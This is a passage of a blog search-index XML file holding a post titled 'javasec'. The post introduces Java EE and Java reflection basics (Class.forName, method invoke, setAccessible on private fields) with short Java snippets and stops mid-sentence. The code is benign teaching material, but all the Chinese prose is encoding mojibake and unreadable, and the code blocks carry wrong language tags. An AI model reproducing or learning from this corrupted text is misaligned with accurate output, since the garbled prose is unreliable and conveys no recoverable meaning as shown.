<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>javasec</title>
      <link href="/2025/07/21/javasec/"/>
      <url>/2025/07/21/javasec/</url>
      
        <content type="html"><![CDATA[<h2 id="javaee"><a href="#javaee" class="headerlink" title="javaee"></a>javaee</h2><h2 id="ä»€ä¹ˆæ˜¯-JavaEE"><a href="#ä»€ä¹ˆæ˜¯-JavaEE" class="headerlink" title="ä»€ä¹ˆæ˜¯ JavaEE"></a>ä»€ä¹ˆæ˜¯ JavaEE</h2><h3 id="JavaEE-æ¦‚å¿µ"><a href="#JavaEE-æ¦‚å¿µ" class="headerlink" title="JavaEE æ¦‚å¿µ"></a>JavaEE æ¦‚å¿µ</h3><p>Java EEï¼ŒJava å¹³å°ä¼ä¸šç‰ˆï¼ˆJava Platform Enterprise Editionï¼‰ï¼Œä¹‹å‰ç§°ä¸ºJava 2 Platform, Enterprise Edition (J2EE)ï¼Œ2018å¹´3æœˆæ›´åä¸º Jakarta EE(è¿™ä¸ªåç§°åº”è¯¥è¿˜æ²¡æœ‰å¾—åˆ°ç¾¤ä¼—è®¤å¯)ã€‚ç‹­ä¹‰çš„ Java EE æ˜¯ Sun å…¬å¸ä¸ºä¼ä¸šçº§åº”ç”¨æ¨å‡ºçš„æ ‡å‡†å¹³å°ï¼Œç”¨æ¥å¼€å‘B&#x2F;Sæ¶æ„è½¯ä»¶ï¼Œå¯ä»¥è¯´æ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯ä¸€ç§è§„èŒƒã€‚</p><p>å¹¿ä¹‰çš„ Java EE åŒ…å«å„ç§æ¡†æ¶ï¼Œå…¶ä¸­æœ€é‡è¦çš„å°±æ˜¯ Spring å…¨å®¶æ¡¶ã€‚Spring è¯ç”Ÿä¹‹åˆæ˜¯ä¸ºäº†æ”¹è¿› Java EE å¼€å‘çš„ä½“éªŒï¼Œåæ¥é€æ¸æˆä¸ºäº† Java Web å¼€å‘çš„å®é™…æ ‡å‡†ã€‚åé¢çš„æ–‡ç« é‡Œï¼Œä¼šå¯¹ Spring è¿›è¡Œè¿›ä¸€æ­¥çš„è¯´æ˜ã€‚</p><h3 id="JavaEE-ä¸-JavaSE-çš„åŒºåˆ«ä¸è”ç³»"><a href="#JavaEE-ä¸-JavaSE-çš„åŒºåˆ«ä¸è”ç³»" class="headerlink" title="JavaEE ä¸ JavaSE çš„åŒºåˆ«ä¸è”ç³»"></a>JavaEE ä¸ <a href="https://so.csdn.net/so/search?q=JavaSE&spm=1001.2101.3001.7020">JavaSE</a> çš„åŒºåˆ«ä¸è”ç³»</h3><p>JavaEE æ˜¯åœ¨ JavaSE çš„åŸºç¡€ä¸Šæ„å»ºçš„ï¼Œæ˜¯å¯¹ JavaSE çš„æ‰©å±•ï¼Œå¢åŠ äº†ä¸€äº›æ›´åŠ ä¾¿æ·çš„åº”ç”¨æ¡†æ¶ã€‚</p><p>é™¤äº† EE å’Œ SEï¼Œè¿˜æœ‰ä¸ºç§»åŠ¨ç«¯è€Œç”Ÿçš„ JavaMEï¼Œä½†ç›®å‰åº”ç”¨ä¸ç®—å¹¿æ³›ã€‚ä¸‰è€…çš„å…³ç³»å¯ä»¥ç”¨ä¸‹å›¾æ¦‚æ‹¬ï¼š</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/1218fe4d5ca24abd52d860eebf8b15c6.png" alt="JavaSE\EE\MEå…³ç³»"></p><h3 id="JavaEEä¸»è¦æŠ€æœ¯"><a href="#JavaEEä¸»è¦æŠ€æœ¯" class="headerlink" title="JavaEEä¸»è¦æŠ€æœ¯"></a>JavaEEä¸»è¦æŠ€æœ¯</h3><p>JavaEE å·ç§°æœ‰åä¸‰ç§æ ¸å¿ƒæŠ€æœ¯ã€‚å®ƒä»¬åˆ†åˆ«æ˜¯ï¼š<strong>JDBC</strong>ã€<strong>JNDI</strong>ã€<strong>EJB</strong>ã€RMIã€<strong>Servlet</strong>ã€<strong>JSP</strong>ã€XMLã€JMSã€Java IDLã€JTSã€JTAã€JavaMailå’ŒJAFã€‚</p><p>ç®€å•ä»‹ç»ä¸‹éœ€è¦é‡ç‚¹å…³æ³¨çš„æŠ€æœ¯ã€‚</p><h4 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h4><p>Java æ•°æ®åº“è¿æ¥ï¼Œï¼ˆJava Database Connectivityï¼ŒJDBCï¼‰æ˜¯ Java è¯­è¨€ä¸­ç”¨æ¥<strong>è§„èŒƒå®¢æˆ·ç«¯ç¨‹åºå¦‚ä½•æ¥è®¿é—®æ•°æ®åº“çš„åº”ç”¨ç¨‹åºæ¥å£</strong>ï¼Œæä¾›äº†è¯¸å¦‚æŸ¥è¯¢å’Œæ›´æ–°æ•°æ®åº“ä¸­æ•°æ®çš„æ–¹æ³•ã€‚</p><h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><p>Java å‘½åå’Œç›®å½•æ¥å£ï¼ˆJava Naming and Directory Interfaceï¼ŒJNDIï¼‰ï¼Œæ˜¯ Java çš„ä¸€ä¸ª<strong>ç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºç•Œé¢</strong>ï¼ˆAPIï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚</p><h4 id="EJB"><a href="#EJB" class="headerlink" title="EJB"></a>EJB</h4><p>ä¼ä¸šçº§ JavaBeanï¼ˆEnterprise JavaBean, EJBï¼‰æ˜¯ä¸€ä¸ªç”¨æ¥æ„ç­‘ä¼ä¸šçº§åº”ç”¨çš„æœåŠ¡å™¨ç«¯å¯è¢«ç®¡ç†<strong>ç»„ä»¶</strong>ã€‚ä¸è¿‡è¿™ä¸ªä¸œè¥¿åœ¨ Spring é—®ä¸–ååŸºæœ¬å‡‰å‡‰äº†ï¼ŒçŸ¥é“æ˜¯ä»€ä¹ˆå°±è¡Œã€‚</p><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><p>Servletï¼ˆServer Appletï¼‰ï¼Œæ˜¯ç”¨ Java ç¼–å†™çš„<strong>æœåŠ¡å™¨ç«¯ç¨‹åº</strong>ã€‚å…¶ä¸»è¦åŠŸèƒ½åœ¨äºäº¤äº’å¼åœ°æµè§ˆå’Œä¿®æ”¹æ•°æ®ï¼Œç”ŸæˆåŠ¨æ€ Web å†…å®¹ã€‚</p><p><strong>ç‹­ä¹‰çš„ Servlet æ˜¯æŒ‡ Java è¯­è¨€å®ç°çš„ä¸€ä¸ªæ¥å£ï¼Œå¹¿ä¹‰çš„ Servlet æ˜¯æŒ‡ä»»ä½•å®ç°äº†è¿™ä¸ª Servlet æ¥å£çš„ç±»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œäººä»¬å°† Servlet ç†è§£ä¸ºåè€…ã€‚</strong></p><h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><p>JSPï¼ˆå…¨ç§°JavaServer Pagesï¼‰æ˜¯ç”± Sun å…¬å¸ä¸»å¯¼åˆ›å»ºçš„ä¸€ç§<strong>åŠ¨æ€ç½‘é¡µæŠ€æœ¯æ ‡å‡†</strong>ã€‚JSP éƒ¨ç½²äºç½‘ç»œæœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥å“åº”å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚å†…å®¹åŠ¨æ€åœ°ç”Ÿæˆ HTMLã€XML æˆ–å…¶ä»–æ ¼å¼æ–‡æ¡£çš„ Web ç½‘é¡µï¼Œç„¶åè¿”å›ç»™è¯·æ±‚è€…ã€‚</p><h3 id="JavaEEæ¡†æ¶"><a href="#JavaEEæ¡†æ¶" class="headerlink" title="JavaEEæ¡†æ¶"></a>JavaEEæ¡†æ¶</h3><p>JavaEE æ‹¥æœ‰å¹¿æ³›å¸‚åœºçš„åŸå› ä¹‹ä¸€å°±æ˜¯å¯ä»¥ä½¿ç”¨å¤šç§æ¡†æ¶æ¥ä½¿å¼€å‘å˜å¾—ç®€å•ã€‚å¯¹äºæ¡†æ¶çš„é€‰æ‹©å¤šç§å¤šæ ·ï¼Œç›®å‰æ¯”è¾ƒå¸¸è§çš„<strong>æ¡†æ¶ç»„åˆ</strong>æœ‰ <strong>SSH</strong>å’Œ<strong>SSM</strong>ã€‚åœ¨åé¢çš„ç« èŠ‚ä¸­ä¼šä½œè¯¦ç»†ä»‹ç»ã€‚å¦å¤–Springæœ¬èº«ä¹Ÿæä¾›äº†å¤šç§å±‚æ¬¡çš„æ¡†æ¶ä¾›é€‰æ‹©ï¼Œå¯ä»¥åˆ°Springå®˜ç½‘äº†è§£è¯¦æƒ…ã€‚</p><p>Springï¼š <a href="https://spring.io/">https://spring.io/</a></p><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p>Structs + Spring + Hibernate</p><h4 id="SSM"><a href="#SSM" class="headerlink" title="SSM"></a>SSM</h4><p>Spring +SpringMVC + MyBatis</p><h3 id="JavaEE-å­¦ä¹ è·¯å¾„"><a href="#JavaEE-å­¦ä¹ è·¯å¾„" class="headerlink" title="JavaEE å­¦ä¹ è·¯å¾„"></a>JavaEE å­¦ä¹ è·¯å¾„</h3><p>ä¸€èˆ¬æ¥è®²ï¼Œåˆå­¦è€…åº”è¯¥éµå¾ªä»¥ä¸‹è·¯å¾„</p><p><strong>Servlet -&gt; JSP -&gt; Spring -&gt; ç»„åˆæ¡†æ¶</strong></p><p>Servlet å’Œ JSP åœ¨æ—¥åçš„å¼€å‘ä¸­è™½ç„¶å¾ˆå°‘ç›´æ¥åº”ç”¨ï¼Œä½†å´æ˜¯å„ç§æ¡†æ¶çš„åŸºç¡€ï¼Œåº”è¯¥æ”¾åœ¨å¼€å§‹å»äº†è§£ã€‚</p><p>æ¨èä¸€ä¸ªå­¦ä¹  Java çš„è‰¯å¿ƒç½‘ç«™ï¼Œé‡Œé¢æœ‰ Java å…¨æ ˆçŸ¥è¯†ï¼Œåœ¨æ¯ä¸ªé˜¶æ®µéƒ½è®¾ç½®äº†ç»ƒä¹ å†…å®¹ï¼Œâ€”â€”</p><p><a href="http://how2j.cn/?p=50613">ã€ŒHow2J çš„ Java æ•™ç¨‹ã€</a></p><h2 id="javaåå°„åŸºç¡€"><a href="#javaåå°„åŸºç¡€" class="headerlink" title="javaåå°„åŸºç¡€"></a>javaåå°„åŸºç¡€</h2><h3 id="ä¸€ã€åå°„åŸºç¡€ä»£ç æ„ŸçŸ¥"><a href="#ä¸€ã€åå°„åŸºç¡€ä»£ç æ„ŸçŸ¥" class="headerlink" title="ä¸€ã€åå°„åŸºç¡€ä»£ç æ„ŸçŸ¥"></a>ä¸€ã€åå°„åŸºç¡€ä»£ç æ„ŸçŸ¥</h3><h4 id="1-åå°„æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#1-åå°„æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1.åå°„æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>1.åå°„æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h4><p>åå°„å°±åƒæ˜¯Javaç»™ä½ çš„â€œåæ‚”è¯â€â€”â€”å…è®¸ä½ åœ¨ä»£ç è·‘èµ·æ¥ä¹‹åï¼Œå†åŠ¨æ€åœ°å»ï¼š</p><ol><li><strong>çœ‹</strong>ä¸€ä¸ªç±»çš„å†…éƒ¨ç»“æ„ï¼ˆæœ‰å•¥æ–¹æ³•ã€å­—æ®µã€æ³¨è§£ï¼‰</li><li><strong>å‡­ç©ºé€ æ–°çš„obj</strong>ï¼ˆnewå¯¹è±¡ï¼‰</li><li><strong>è¿œç¨‹æ“æ§</strong>ï¼ˆè°ƒæ–¹æ³•ã€æ”¹å­—æ®µå€¼ï¼‰</li><li><strong>æ— è§†éšç§</strong>ï¼ˆè®¿é—®<code>private</code>æˆå‘˜ï¼ï¼‰</li></ol><blockquote><p><strong>ä¸ºå•¥å«â€œåå°„â€ï¼Ÿ</strong><br>å¯ä»¥æŠŠä¸€ä¸ªç±»å½“æˆé•œå­ï¼Œåå°„å°±æ˜¯è®©ä½ åœ¨è¿è¡Œæ—¶â€œç…§é•œå­â€â€”â€”çœ‹æ¸…è‡ªå·±ï¼ˆç±»ï¼‰é•¿å•¥æ ·ï¼Œè¿˜èƒ½åŠ¨æ‰‹åŠ¨è„šï¼ˆæ”¹å®ƒï¼‰ã€‚</p></blockquote><h4 id="2-åå°„èƒ½åšä»€ä¹ˆï¼Ÿ"><a href="#2-åå°„èƒ½åšä»€ä¹ˆï¼Ÿ" class="headerlink" title="2. åå°„èƒ½åšä»€ä¹ˆï¼Ÿ"></a>2. <strong>åå°„èƒ½åšä»€ä¹ˆï¼Ÿ</strong></h4><p>é€šè¿‡åå°„ï¼Œ<strong>è¿è¡Œæ—¶</strong>åŠ¨æ€æ“ä½œç±»ä¿¡æ¯ï¼Œæ— éœ€åœ¨ç¼–è¯‘æ—¶ç¡®å®šå…·ä½“ç±»ã€‚ä»¥ä¸‹ä»£ç æ¼”ç¤ºæ ¸å¿ƒåŠŸèƒ½ï¼š</p><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. åŠ¨æ€åŠ è½½ç±»ï¼ˆç±»åå¯æ¥è‡ªé…ç½®æ–‡ä»¶/ç½‘ç»œï¼‰</span></span><br><span class="line">Class&lt;?&gt; clazz = Class.<span class="property">forName</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. åˆ›å»ºå¯¹è±¡ï¼ˆæ— éœ€newå…³é”®å­—ï¼‰</span></span><br><span class="line"><span class="built_in">Object</span> <span class="built_in">str</span> = clazz.<span class="property">getDeclaredConstructor</span>().<span class="property">newInstance</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. è°ƒç”¨æ–¹æ³•ï¼ˆæ–¹æ³•åå¯åŠ¨æ€ä¼ å…¥ï¼‰</span></span><br><span class="line">Method method = clazz.<span class="property">getMethod</span>(<span class="string">&quot;substring&quot;</span>, <span class="type">int</span>.<span class="property">class</span>);</span><br><span class="line"><span class="built_in">String</span> result = (<span class="built_in">String</span>) method.<span class="property">invoke</span>(<span class="built_in">str</span>, <span class="number">2</span>); <span class="comment">// è°ƒç”¨str.substring(2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. è®¿é—®ç§æœ‰å­—æ®µï¼ˆçªç ´å°è£…æ€§ï¼‰</span></span><br><span class="line">Field field = clazz.<span class="property">getDeclaredField</span>(<span class="string">&quot;value&quot;</span>); <span class="comment">// Stringå†…éƒ¨å­˜å‚¨å­—ç¬¦çš„æ•°ç»„</span></span><br><span class="line">field.<span class="property">setAccessible</span>(<span class="literal">true</span>); <span class="comment">// æš´åŠ›åå°„ï¼</span></span><br><span class="line"><span class="type">byte</span>[] value = (<span class="type">byte</span>[]) field.<span class="property">get</span>(<span class="built_in">str</span>);</span><br><span class="line">System.<span class="property">out</span>.<span class="property">println</span>(Arrays.<span class="property">toString</span>(value)); <span class="comment">// è¾“å‡ºå­—ç¬¦æ•°ç»„</span></span><br></pre></td></tr></table></figure><p>ä»¥<strong>Spring IOC</strong>ä¸ºä¾‹ï¼Œå®ƒå¤§æ¦‚è¿™ä¹ˆç©åå°„ï¼š</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanFactory</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">Map</span>&lt;<span class="title class_">String</span>, <span class="title class_">Object</span>&gt; beanMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">registerBean</span>(<span class="params"><span class="title class_">String</span> beanName, <span class="title class_">String</span> className</span>) &#123;</span><br><span class="line">        <span class="comment">// 1. åå°„åŠ è½½ç±»</span></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; clazz = <span class="title class_">Class</span>.<span class="title function_">forName</span>(className);</span><br><span class="line">        <span class="comment">// 2. åå°„åˆ›å»ºå¯¹è±¡ï¼ˆé€šå¸¸è°ƒæ— å‚æ„é€ ï¼‰</span></span><br><span class="line">        <span class="title class_">Object</span> bean = clazz.<span class="title function_">getDeclaredConstructor</span>().<span class="title function_">newInstance</span>();</span><br><span class="line">        <span class="comment">// 3. å¡è¿›å®¹å™¨ï¼ˆä¸‹æ¬¡getBeanç›´æ¥æ‹¿ï¼‰</span></span><br><span class="line">        beanMap.<span class="title function_">put</span>(beanName, bean);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">Object</span> <span class="title function_">getBean</span>(<span class="params"><span class="title class_">String</span> beanName</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> beanMap.<span class="title function_">get</span>(beanName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å®é™…Springè¿˜åšäº†<strong>ä¾èµ–æ³¨å…¥</strong>ï¼ˆç”¨åå°„<code>set</code>å­—æ®µï¼‰ã€<strong>AOPä»£ç†</strong>ï¼ˆåå°„è°ƒæ–¹æ³•ï¼‰â€”â€” æ‰€ä»¥è¯´æ²¡åå°„å°±æ²¡Springï¼</p></blockquote><blockquote><p>å¦å¤–è¿›é˜¶çš„ï¼ˆå¾…ï¼‰ï¼š</p><ul><li><strong>åŠ¨æ€ä»£ç†</strong>ï¼šJDKçš„<code>Proxy.newProxyInstance()</code>é åå°„ç”Ÿæˆä»£ç†ç±»ï¼Œå®ç°AOPåˆ‡é¢ã€‚</li></ul></blockquote><ul><li><strong>æ³¨è§£æ‰«æ</strong>ï¼šJUnitç”¨åå°„æ‰¾<code>@Test</code>æ–¹æ³•ï¼›Springæ‰«æ<code>@Component</code>ã€‚</li><li><strong>è¶Šè¿‡æ³›å‹æ“¦é™¤</strong>ï¼šåå°„èƒ½æ‹¿åˆ°<code>List&lt;String&gt;</code>çš„å®é™…æ³›å‹ç±»å‹ï¼ˆè™½ç„¶99%åœºæ™¯ç”¨ä¸åˆ°ï¼‰ã€‚</li></ul><p><strong>å…³é”®ç‚¹</strong>ï¼š</p><ul><li><code>Class.forName()</code>ï¼šé€šè¿‡å­—ç¬¦ä¸²åŠ è½½ç±»ï¼ˆ<strong>è§£è€¦</strong>çš„å…³é”®ï¼‰</li><li><code>getMethod()</code> + <code>invoke()</code>ï¼šåŠ¨æ€è°ƒç”¨æ–¹æ³•ï¼ˆæ¡†æ¶æ ¸å¿ƒåŸç†ï¼‰</li><li><code>setAccessible(true)</code>ï¼šè®¿é—®ç§æœ‰æˆå‘˜ï¼ˆ<strong>æ…ç”¨</strong>ï¼Œç ´åå°è£…æ€§ï¼‰</li></ul><hr><h3 id="äºŒã€åå°„çš„æ ¸å¿ƒåŸç†ä¸ç±»åº“"><a href="#äºŒã€åå°„çš„æ ¸å¿ƒåŸç†ä¸ç±»åº“" class="headerlink" title="äºŒã€åå°„çš„æ ¸å¿ƒåŸç†ä¸ç±»åº“"></a>äºŒã€åå°„çš„æ ¸å¿ƒåŸç†ä¸ç±»åº“</h3><h4 id="1-åå°„çš„åŸºçŸ³ï¼šClasså¯¹è±¡â€”â€“-åå°„çš„é’¥åŒ™"><a href="#1-åå°„çš„åŸºçŸ³ï¼šClasså¯¹è±¡â€”â€“-åå°„çš„é’¥åŒ™" class="headerlink" title="1. åå°„çš„åŸºçŸ³ï¼šClasså¯¹è±¡â€”â€“ åå°„çš„é’¥åŒ™"></a>1. <strong>åå°„çš„åŸºçŸ³ï¼š<code>Class</code>å¯¹è±¡</strong>â€”â€“ <strong>åå°„çš„é’¥åŒ™</strong></h4><ul><li><p><strong>æ¯ä¸ªç±»åœ¨JVMä¸­åªæœ‰ä¸€ä¸ª<code>Class</code>å¯¹è±¡</strong>ï¼Œå­˜å‚¨ç±»å…ƒä¿¡æ¯ï¼ˆæ–¹æ³•ã€å­—æ®µç­‰ï¼‰ã€‚</p></li><li><p>è·å–<code>Class</code>å¯¹è±¡çš„ä¸‰ç§æ–¹å¼ï¼š</p>  <figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; c1 = String.<span class="keyword">class</span>;          <span class="comment">// ç±»å­—é¢é‡</span></span><br><span class="line"><span class="keyword">Class</span>&lt;?&gt; c2 = <span class="string">&quot;abc&quot;</span>.getClass();      <span class="comment">// å¯¹è±¡å®ä¾‹</span></span><br><span class="line"><span class="keyword">Class</span>&lt;?&gt; c3 = <span class="keyword">Class</span>.forName(<span class="string">&quot;java.lang.String&quot;</span>); <span class="comment">// æœ€å¸¸ç”¨ï¼ˆåŠ¨æ€åŠ è½½ï¼‰</span></span><br></pre></td></tr></table></figure><p>  <strong>ä¸ºä»€ä¹ˆç”¨<code>Class.forName</code>ï¼Ÿ</strong><br>  æ”¯æŒä»é…ç½®æ–‡ä»¶&#x2F;æ•°æ®åº“è¯»å–ç±»åï¼Œå®ç°<strong>åŠ¨æ€æ‰©å±•</strong>ï¼ˆå¦‚Springçš„BeanåŠ è½½ï¼‰ã€‚</p></li></ul><h4 id="2-åå°„æ“ä½œçš„ä¸‰ç±»API"><a href="#2-åå°„æ“ä½œçš„ä¸‰ç±»API" class="headerlink" title="2. åå°„æ“ä½œçš„ä¸‰ç±»API"></a>2. <strong>åå°„æ“ä½œçš„ä¸‰ç±»API</strong></h4><table><thead><tr><th><strong>æ“ä½œç±»å‹</strong></th><th><strong>æ ¸å¿ƒç±»</strong></th><th><strong>å¸¸ç”¨æ–¹æ³•</strong></th><th><strong>ç”¨é€”</strong></th></tr></thead><tbody><tr><td><strong>åˆ›å»ºå¯¹è±¡</strong></td><td><code>Constructor</code></td><td><code>getDeclaredConstructor()</code> + <code>newInstance()</code></td><td>æ›¿ä»£<code>new</code>å…³é”®å­—</td></tr><tr><td><strong>è°ƒç”¨æ–¹æ³•</strong></td><td><code>Method</code></td><td><code>getMethod()</code> + <code>invoke()</code></td><td>åŠ¨æ€æ‰§è¡Œæ–¹æ³•ï¼ˆå¦‚Spring MVCæ§åˆ¶å™¨ï¼‰</td></tr><tr><td><strong>è®¿é—®å­—æ®µ</strong></td><td><code>Field</code></td><td><code>getDeclaredField()</code> + <code>get()/set()</code></td><td>è¯»å†™å­—æ®µå€¼ï¼ˆåŒ…æ‹¬ç§æœ‰å­—æ®µï¼‰</td></tr></tbody></table><h4 id="ä¸ç”¨newä¹Ÿèƒ½åˆ›å»ºå¯¹è±¡"><a href="#ä¸ç”¨newä¹Ÿèƒ½åˆ›å»ºå¯¹è±¡" class="headerlink" title="** ä¸ç”¨newä¹Ÿèƒ½åˆ›å»ºå¯¹è±¡**"></a>** ä¸ç”¨newä¹Ÿèƒ½åˆ›å»ºå¯¹è±¡**</h4><p>æ‹¿åˆ°<code>Class</code>åï¼Œå°±èƒ½åˆ›å»ºå¯¹è±¡äº†ï¼å°¤å…¶é€‚åˆ<strong>ä¸çŸ¥é“å…·ä½“ç±»</strong>çš„åœºæ™¯ï¼ˆæ¯”å¦‚Springåˆ›å»ºBeanï¼‰ï¼š</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1ï¼šè°ƒæ— å‚æ„é€ ï¼ˆæœ€å¸¸ç”¨ï¼‰</span></span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.User&quot;</span>);</span><br><span class="line"><span class="built_in">Object</span> user = clazz.getDeclaredConstructor().newInstance(); <span class="comment">// ç›¸å½“äº new User()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2ï¼šè°ƒæœ‰å‚æ„é€ ï¼ˆå¸¦å‚æ•°çš„é‚£ç§ï¼‰</span></span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getConstructor(<span class="built_in">String</span>.<span class="keyword">class</span>, <span class="built_in">int</span>.<span class="keyword">class</span>); <span class="comment">// å‚æ•°ç±»å‹åˆ—è¡¨</span></span><br><span class="line"><span class="built_in">Object</span> user2 = constructor.newInstance(<span class="string">&quot;å¼ ä¸‰&quot;</span>, <span class="number">25</span>); <span class="comment">// ä¼ å…¥å®å‚</span></span><br></pre></td></tr></table></figure><blockquote><p> <strong>å‘</strong>ï¼š<code>clazz.newInstance()</code>å·²è¿‡æ—¶ï¼ç”¨<code>getDeclaredConstructor().newInstance()</code>ä»£æ›¿ã€‚</p></blockquote><hr><h4 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="** æ–¹æ³•**"></a>** æ–¹æ³•**</h4><p>åŠ¨æ€è°ƒæ–¹æ³•æ‰æ˜¯åå°„çš„å¥½ç©æ“ä½œï¼æ¯”å¦‚æ ¹æ®ç”¨æˆ·è¾“å…¥è°ƒç”¨ä¸åŒAPIï¼š</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ­¥éª¤1ï¼šæ‹¿åˆ°Methodå¯¹è±¡ï¼ˆæ–¹æ³•å+å‚æ•°ç±»å‹ï¼‰</span></span><br><span class="line">Method method = clazz.<span class="built_in">getMethod</span>(<span class="string">&quot;setName&quot;</span>, <span class="type">String</span>.<span class="keyword">class</span>); <span class="comment">// æ–¹æ³•å&quot;setName&quot;ï¼Œå‚æ•°String</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­¥éª¤2ï¼šå¯¹ç€å¯¹è±¡â€œæŒ‰æŒ‰é’®â€ï¼ˆinvokeï¼‰</span></span><br><span class="line">method.<span class="built_in">invoke</span>(user, <span class="string">&quot;å¼ ä¸‰&quot;</span>); <span class="comment">// ç›¸å½“äº user.setName(&quot;å¼ ä¸‰&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”šè‡³...è°ƒç”¨ç§æœ‰æ–¹æ³•ï¼ï¼ˆå±é™©åŠ¨ä½œï¼‰</span></span><br><span class="line">Method secretMethod = clazz.<span class="built_in">getDeclaredMethod</span>(<span class="string">&quot;privateMethod&quot;</span>);</span><br><span class="line">secretMethod.<span class="built_in">setAccessible</span>(<span class="literal">true</span>); <span class="comment">// æš´åŠ›çªç ´privateé™åˆ¶ï¼</span></span><br><span class="line">secretMethod.<span class="built_in">invoke</span>(user);</span><br></pre></td></tr></table></figure><blockquote><p> <strong>é»‘ç§‘æŠ€</strong>ï¼š<code>setAccessible(true)</code>æ˜¯åå°„çš„â€œç ´å¢™é”¤â€â€”â€”èƒ½è®¿é—®<code>private</code>&#x2F;<code>protected</code>æˆå‘˜ï¼ˆæ¡†æ¶é‡Œå¸¸ç”¨ï¼Œè‡ªå·±ä»£ç æ…ç”¨ï¼ï¼‰ã€‚</p></blockquote><hr><h4 id="æ”¹å­—æ®µâ€”â€”æ”¹å¯¹è±¡å†…å­˜"><a href="#æ”¹å­—æ®µâ€”â€”æ”¹å¯¹è±¡å†…å­˜" class="headerlink" title="** æ”¹å­—æ®µâ€”â€”æ”¹å¯¹è±¡å†…å­˜**"></a>** æ”¹å­—æ®µâ€”â€”æ”¹å¯¹è±¡å†…å­˜**</h4><p>ç›´æ¥ä¿®æ”¹å¯¹è±¡å±æ€§ï¼Œè¿setteréƒ½ä¸ç”¨</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å·çœ‹å­—æ®µå€¼</span></span><br><span class="line">Field field = clazz.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>); <span class="comment">// æ— è§†private</span></span><br><span class="line"><span class="built_in">int</span> age = (<span class="built_in">int</span>) field.<span class="keyword">get</span>(user); <span class="comment">// æ‹¿åˆ°user.ageçš„å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å·å·æ”¹æ‰ï¼</span></span><br><span class="line">field.<span class="keyword">set</span>(user, <span class="number">30</span>); <span class="comment">// ç¥ä¸çŸ¥é¬¼ä¸è§‰æŠŠageæ”¹æˆ30</span></span><br></pre></td></tr></table></figure><blockquote><p> <strong>å®éªŒ</strong>ï¼šè¯•è¯•ç”¨åå°„æ”¹<code>String</code>çš„å†…å®¹ï¼Ÿâ€”â€” JVMå¯¹<code>String</code>åšäº†ä¼˜åŒ–ï¼Œåˆ«ç™½è´¹åŠ²å•¦ã€‚</p></blockquote><blockquote><p> <strong>å¯¹æ¯”ï¼š</strong></p><ul><li><code>getDeclaredXxx()</code>ï¼šè·å–<strong>æ‰€æœ‰</strong>æˆå‘˜ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰</li><li><code>getXxx()</code>ï¼šä»…è·å–<strong>public</strong>æˆå‘˜</li></ul></blockquote><h4 id="3-åå°„çš„åº•å±‚å®ç°"><a href="#3-åå°„çš„åº•å±‚å®ç°" class="headerlink" title="3. åå°„çš„åº•å±‚å®ç°"></a>3. <strong>åå°„çš„åº•å±‚å®ç°</strong></h4><ul><li><strong>ç±»åŠ è½½æœºåˆ¶</strong>ï¼š<br>  JVMåŠ è½½<code>.class</code>æ–‡ä»¶ â†’ ç”Ÿæˆ<code>Class</code>å¯¹è±¡ â†’ 